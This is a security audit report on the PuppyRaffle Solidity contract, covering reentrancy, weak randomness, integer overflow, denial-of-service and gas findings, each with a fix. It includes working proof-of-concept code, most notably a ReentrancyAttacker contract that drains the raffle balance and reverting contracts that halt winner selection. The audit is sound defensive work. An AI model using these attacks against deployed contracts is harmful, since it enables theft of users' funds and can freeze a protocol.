# High

### [H-1] Reentrancy attack on `PuppyRaffle::refund()`, allows attacker to drain raffle balance

**<ins>Description:</ins>** 

- The `PuppyRaffle::refund()` function, doesn't follow CEI (Checks, Effects and Interactions) as a result enables participants to drain the contract balance.
- In the `PuppyRaffle::refund()` function, we are making an external call to `msg.sender` address, only after making that external call we are updating the `PuppyRaffle::players` array.
- For more info on re-entrancy attack vector please refer to this [article](https://blog.sigmaprime.io/solidity-security.html#reentrancy) 

```js
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);
        
        emit RaffleRefunded(playerAddress);
    }
```

**<ins>Impact:</ins>** 

- Stealing of unauthorised raffle balance by the malicious participant

**<ins>Proof of Concept:</ins>**

- User enters the raffle
- Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund()` 
- Attacker enters the raffle
- Attacker calls the `PuppyRaffle::refund()` function which eventually drains the contract balance 

<details>

<summary>Proof of Code</summary>

1. Create a mock of attacker contract 

```js
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 addressIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        addressIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(addressIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance > 0) {
            puppyRaffle.refund(addressIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}

```

2. Add the test function in the test file
```js
    function test_reEntrancyattack() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        uint256 startTotalAmt = address(puppyRaffle).balance;

        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
        vm.deal(address(attacker), entranceFee);

        attacker.attack();

        assertEq(startTotalAmt, 4 * entranceFee);
        assertEq(address(puppyRaffle).balance, 0);
        assertEq(address(attacker).balance, 5 * entranceFee);
    }
```
</details>


**<ins>Recommended Mitigation:</ins>** 

- In the `PuppyRaffle::refund()` function, we should make the state update first before making the call to `msg.sender`.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+      players[playerIndex] = address(0);
+      emit RaffleRefunded(playerAddress);
       payable(msg.sender).sendValue(entranceFee);
-      players[playerIndex] = address(0);
-      emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner()` allows user to influence or predict the winner & influence or predict the winning puppy.

**<ins>Description:</ins>**
- Hasing `msg.sender`, `block.timestamp` & `block.difficulty` together creates a predictable number. A predictable number is not a good random number.

*Note:* This additionally means, users could front-run this function and call `refund` if they see they are not the winner.

**<ins>Impact:</ins>** 
- Any user can influence the winner of the raffle, winning the money and selecting the rarest puppy NFT.

**<ins>Proof of Concept:</ins>**

- Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use these information to accurately predict when to enter the raffle. See the [Solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao)
- User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner!
- User can revert the `selectWinner()` transaction if they don't like the winner or resulting puppy NFT.

**<ins>Recommended Mitigation:</ins>** 

- Protocol can use solutions like [ChainLink VRF](https://docs.chain.link/vrf) to generate truely random numbers for selecting winner and minting puppy NFT.


### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

**<ins>Description:</ins>** 
- In Solidity versions prior to v0.8.0, integers were subject to integer over/under flow.

```js
uint64 myVar = type(uint64).max; 
// myVar will be 18446744073709551615
myVar = myVar + 1;
// myVar will be 0
```

**<ins>Impact:</ins>** 
- This could lead to loss of `PuppyRaffle::totalFees` that are accumulated for the `PuppyRaffle::feeAddress` to collect later.
- If the `totalFees` overflows, there is no chance we can withdraw fees in the future resulting permanent stuck of funds in the contract.

**<ins>Proof of Concept:</ins>**

- We first conclude a raffle of 4 players to collect some fees.
- We then have 89 additional players enter a new raffle, and we conclude that raffle as well.
- `totalFees` will be:
```js
totalFees = totalFees + uint64(fee);
// substituted
totalFees = 800000000000000000 + 17800000000000000000;
// due to overflow, the following is now the case
totalFees = 153255926290448384;
```
- we will now not be able to withdraw, due to this line in `PuppyRaffle::withdrawFees()`:
```js
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```
- The above code also introduces another issue, where a attacker contract can forcibly send ETH to this contract and resulting in permanent lock of fees in the contract which can't never be withdrawn.

<details>

<summary>Proof of code</summary>

Place this into the `PuppyRaffleTest.t.sol` file.

```js
    function test_arithmeticOverFlow() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();

        uint256 startingTotalFees = puppyRaffle.totalFees();

        // Add new players to new ongoing raffle
        // Already fees of 4 players is stored
        // to overflow totalFees we need minimum of 93 ether then 20% of 93 ether would be ~ 19ETH and that overflows type(uint64).max
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```

</details>


**<ins>Recommended Mitigation:</ins>** There are few mitigations to consider in order to be safe

- Use a newer version of Solidity that does not allow integer overflows by default.
```diff
-   pragma solidity ^0.7.6;
+   pragma solidity 0.8.18;
```
Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's SafeMath to prevent integer overflows.

- Use a uint256 instead of a uint64 for totalFees.
```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
```

- Remove the balance check in `PuppyRaffle::withdrawFees()`
```diff
-   require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```


### [H-4] Malicious winner can forever halt the raffle

**<ins>Description:</ins>** 
- Once the winner is chosen, the `selectWinner` function sends the prize to the the corresponding address with an external call to the winner account.

```js
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
```
- If the winner account were a smart contract that did not implement a payable `fallback` or `receive` function, or these functions were included but reverted, the external call above would fail, and execution of the `selectWinner` function would halt. Therefore, the prize would never be distributed and the raffle would never be able to start a new round.
- There's another attack vector that can be used to halt the raffle, leveraging the fact that the `selectWinner` function mints an NFT to the winner using the `_safeMint` function. This function, inherited from the `ERC721` contract, attempts to call the `onERC721Received` hook on the receiver if it is a smart contract. Reverting when the contract does not implement such function.
- Therefore, an attacker can register a smart contract in the raffle that does not implement the `onERC721Received` hook expected. This will prevent minting the NFT and will revert the call to `selectWinner`.

**<ins>Impact:</ins>** 
- In either case, because it'd be impossible to distribute the prize and start a new round, the raffle would be halted forever.

**<ins>Proof of Concept:</ins>**

<details>

<summary>Proof of Code</summary>

Place the following test into `PuppyRaffleTest.t.sol`.

```js
    function testSelectWinnerDoS() public {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        address[] memory players = new address[](4);
        players[0] = address(new AttackerContract());
        players[1] = address(new AttackerContract());
        players[2] = address(new AttackerContract());
        players[3] = address(new AttackerContract());
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.expectRevert();
        puppyRaffle.selectWinner();
    }
```
For example, the `AttackerContract` can be this:

```js
contract AttackerContract {
    // Implements a `receive` function that always reverts
    receive() external payable {
        revert();
    }
}
```

or this,

```js
contract AttackerContract {
    // Implements a `receive` function to receive prize, but does not implement `onERC721Received` hook to receive the NFT.
    receive() external payable {}
}
```

</details>

**<ins>Recommended Mitigation:</ins>** 
- Favor pull-payments over push-payments. This means modifying the `selectWinner` function so that the winner account has to claim the prize by calling a function, instead of having the contract automatically send the funds during execution of `selectWinner`.

# Medium

### [M-1] `PuppyRaffle::enterRaffle()` is a potential DoS attack vector, incrementing gas costs for future entrants

**<ins>Description:</ins>** 
- The `PuppyRaffle::enterRaffle()` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make.
- This means that the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later

**<ins>Impact:</ins>** 
- The gas costs for raffle entrants will greatly increase as more players enter the raffle.
- Front-running opportunities are created for malicious users to increase the gas costs of other users, so their transaction fails.

**<ins>Proof of Concept:</ins>**

If we have 2 sets of 100 players enter, the gas costs will be as such:
- 1st 100 players: 6252039
- 2nd 100 players: 18067741
This is more than 3x as expensive for the second set of 100 players!
This is due to the for loop in the `PuppyRaffle::enterRaffle()` function.

```js
    // Check for duplicates
@>  for(uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

<details>
<summary>Proof of Code</summary>

Place the following test into `PuppyRaffleTest.t.sol`.

```js
    function test_DosAttack() public {
        vm.txGasPrice(1);

        uint256 n = 100;
        address[] memory players = new address[](n);

        for (uint256 i = 0; i < n; ++i) {
            players[i] = address(uint160(i));
        }

        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * n}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;

        // For 2nd 100 players
        address[] memory playersTwo = new address[](n);

        for (uint256 i = 0; i < n; ++i) {
            playersTwo[i] = address(uint160(i + n));
        }

        gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * n}(playersTwo);
        gasEnd = gasleft();

        uint256 gasUsedSecond = (gasStart - gasEnd) * tx.gasprice;

        assertGt(gasUsedSecond, gasUsedFirst);
    }
```

</details>

**<ins>Recommended Mitigation:</ins>** 

There are a few recommended mitigations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.


```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;            
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }    
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

### [M-2] Unsafe cast of PuppyRaffle::fee loses fees

**<ins>Description:</ins>** 
-In `PuppyRaffle::selectWinner()` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated.

```js
    function selectWinner() external {
        // ...
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
@>      totalFees = totalFees + uint64(fee);
        // ...
    }
```
The max value of a uint64 is 18446744073709551615. In terms of ETH, this is only ~19 ETH. Meaning, if more than 19ETH of fees are collected, the fee casting will truncate the value.

**<ins>Impact:</ins>** 

- This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**<ins>Proof of Concept:</ins>**

1. A raffle proceeds with a little more than 18 ETH worth of fees collected
2. The line that casts the `fee` as a `uint64` hits
3. `totalFees` is incorrectly updated with a lower amount

You can replicate this in foundry's chisel by running the following:
```js
uint256 max = type(uint64).max
uint256 fee = max + 1
uint64(fee)
// prints 0
```

**<ins>Recommended Mitigation:</ins>** 

Set `PuppyRaffle::totalFees` to a uint256 instead of a `uint64`, and remove the casting. Their is a comment which says:
```js
// We do some storage packing to save gas
```
But the potential gas saved isn't worth it if we have to recast and this bug exists.

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        // ...
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
        // ...
    }
```


### [M-2] If all users requests a refund and raffle duration ends, `PuppyRaffle::selectWinner()` will always revert

**<ins>Description:</ins>** 
- If all participants requests refund and the raffle duration has elapsed, the calling `selectWinner()` function will always revert because of the attempt to send the `prizePool` funds to `address(0)` and mint the NFT to the zero-address.
- If `PuppyRaffle` contract has insufficient funds, we get `EVMError: OutOfFunds`, otherwise we get the revert as we try to mint a NFT to zero-address.

**<ins>Impact:</ins>** 
- No impact on funds, however `selectWinner()` is blocked and will always revert.

**<ins>Proof of Concept:</ins>**

<details>

<summary>Proof of Code</summary>

Place the following test into `PuppyRaffleTest.t.sol`. 

```js
    function test_selectWinnerAlwaysRevertWhenAllParticipantsRequestRefund() public {
        uint256 n = 5;
        address[] memory players = new address[](n);

        for (uint256 i = 0; i < n; ++i) {
            players[i] = address(uint160(i + 1));
            vm.deal(address(uint160(i + 1)), 10 ether);
        }

        puppyRaffle.enterRaffle{value: n * entranceFee}(players);

        // // refund all
        for (uint256 i = 0; i < n; i++) {
            vm.prank(address(uint160(i + 1)));
            puppyRaffle.refund(i);
        }

        // // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
    }
```

</details>

**<ins>Recommended Mitigation:</ins>**
- The issue is zero-address, in order to tackle this issue we can have something access controlled way to restart the raffle.
- Or may be use add checks to `selectWinner()` to revert if all the participants have requested refund.


# Low

### [L-1] `PuppyRaffle::getActivePlayerIndex()` returns 0 for non-participant and for player address at index 0

**<ins>Description:</ins>** 
- If the player is in the `PuppyRaffle::players` array at index 0, this will return 0 but according to natspec, it will also return 0, if the player is not in tha array.

```js
    /// @return the index of the player in the array, if they are not active, it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

**<ins>Impact:</ins>** 
- A player at index 0, may incorrectly think they didn't enter the raffle and attemp to re-enter again wasting gas.

**<ins>Proof of Concept:</ins>**

- User enters the raffle, they are the first entrant.
- `PuppyRaffle::getActivePlayerIndex()` returns 0 for the user.
- User thinks they have not entered correctly due to function documentation.

**<ins>Recommended Mitigation:</ins>** 

- The easiest mitigation would be simply revert if the player is not present in the `PuppyRaffle::players` list.
- We can reserve the 0th position for any competition, but a better solution would be to return `int256` where the function returns -1 if the player is not active.



# Gas

### [G-1] Unchanged state vars should be declared constant or immutable

- Reading from storage is much more expensive than reading from constant or immutable variable

Instances:
- `PuppyRaffle::raffleDuration` should be made `immutable`
- `PuppyRaffle::commonImageUri`, `PuppyRaffle::rareImageUri` and `PuppyRaffle::legendaryImageUri` should be made `constant`


### [G-2] Storage variable in loop should be computed before hand

- Reading `players.length` in every iteration is very gas inefficient, should be cached before hand.

<details><summary>2 Found Instances</summary>

1. 
```diff
+   uint256 newPlayersLength = newPlayers.length;
-   for (uint256 i = 0; i < newPlayers.length; i++) {
+   for (uint256 i = 0; i < newPlayersLength; i++) {
        players.push(newPlayers[i]);
    }
```

2. 
```diff
+   uint256 playersLength = players.length;
-   for (uint256 i = 0; i < players.length - 1; i++) {
+   for (uint256 i = 0; i < playersLength - 1; i++) {
-       for (uint256 j = i + 1; j < players.length; j++) {
+       for (uint256 j = i + 1; j < playersLength; j++) { 
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }

```

</details>


# Informational/Non-Critical

### [I-1] Unspecific Solidity Pragma

- Consider using a specific version of Solidity in your contracts instead of a floating version. For example, instead of `pragma solidity ^0.7.6;`, use `pragma solidity 0.7.6;`
- It's recommended to upgrade solidity version v0.8+ for built in safeMath checks. see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information.

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 3](src/PuppyRaffle.sol#L3)

    ```solidity
    pragma solidity ^0.7.6;
    ```

</details>


### [I-2] Address State Variable Set Without Checks

- Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 69](src/PuppyRaffle.sol#L69)

    ```solidity
            feeAddress = _feeAddress;
    ```

- Found in src/PuppyRaffle.sol [Line: 205](src/PuppyRaffle.sol#L205)

    ```solidity
            feeAddress = newFeeAddress;
    ```

</details>

### [I-3] `PuppyRaffle::selectWinner()` doesn't follow CEI, which is a best practise.

- It's best to keep code clean and should follow CEI (Checks, Effects and Interations) 

```diff
-    (bool success,) = winner.call{value: prizePool}("");
-    require(success, "PuppyRaffle: Failed to send prize pool to winner");
     _safeMint(winner, tokenId);
+    (bool success,) = winner.call{value: prizePool}("");
+    require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

### [I-4] Magic numbers

- All number litterals should be replaced with constants. This makes code more readable and easier to maintain. 

```diff
+   uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
+   uint256 public constant FEE_PERCENTAGE = 20;
+   uint256 public constant TOTAL_PERCENTAGE = 100;
.
.
.
-   uint256 prizePool = (totalAmountCollected * 80) / 100;
-   uint256 fee = (totalAmountCollected * 20) / 100;
+   uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / TOTAL_PERCENTAGE;
+   uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / TOTAL_PERCENTAGE;
```

### [I-5] _isActivePlayer is never used and should be removed

The function PuppyRaffle::_isActivePlayer is never used and should be removed.

```diff
-    function _isActivePlayer() internal view returns (bool) {
-        for (uint256 i = 0; i < players.length; i++) {
-            if (players[i] == msg.sender) {
-                return true;
-            }
-        }
-        return false;
-    }
```


### [I-6] Zero address may be erroneously considered an active player

**<ins>Description:</ins>**  
- The refund function removes active players from the players array by setting the corresponding slots to zero. This is confirmed by its documentation, stating that "This function will allow there to be blank spots in the array". However, this is not taken into account by the getActivePlayerIndex function. If someone calls getActivePlayerIndex passing the zero address after there's been a refund, the function will consider the zero address an active player, and return its index in the players array.

**<ins>Recommended Mitigation:</ins>** 
- Skip zero addresses when iterating the players array in the getActivePlayerIndex. Do note that this change would mean that the zero address can never be an active player. Therefore, it would be best if you also prevented the zero address from being registered as a valid player in the enterRaffle function.

### [I-7] Test coverage

The test coverage of the tests are below 90%. This often means that there are parts of the code that are not tested.

```
╭----------------------------------+----------------+-----------------+----------------+----------------╮
| File                             | % Lines        | % Statements    | % Branches     | % Funcs        |
+=======================================================================================================+
| script/DeployPuppyRaffle.sol     | 0.00% (0/4)    | 0.00% (0/4)     | 100.00% (0/0)  | 0.00% (0/1)    |
|----------------------------------+----------------+-----------------+----------------+----------------|
| src/PuppyRaffle.sol              | 84.21% (64/76) | 84.88% (73/86)  | 69.23% (18/26) | 80.00% (8/10)  |
|----------------------------------+----------------+-----------------+----------------+----------------|
| test/Mock/ReentrancyAttacker.sol | 87.50% (14/16) | 91.67% (11/12)  | 100.00% (1/1)  | 80.00% (4/5)   |
|----------------------------------+----------------+-----------------+----------------+----------------|
| Total                            | 81.25% (78/96) | 82.35% (84/102) | 70.37% (19/27) | 75.00% (12/16) |
╰----------------------------------+----------------+-----------------+----------------+----------------╯
```

# Signature
*Deepak kashyap aka (Cynefin)* 
*Date: 2025/03/18*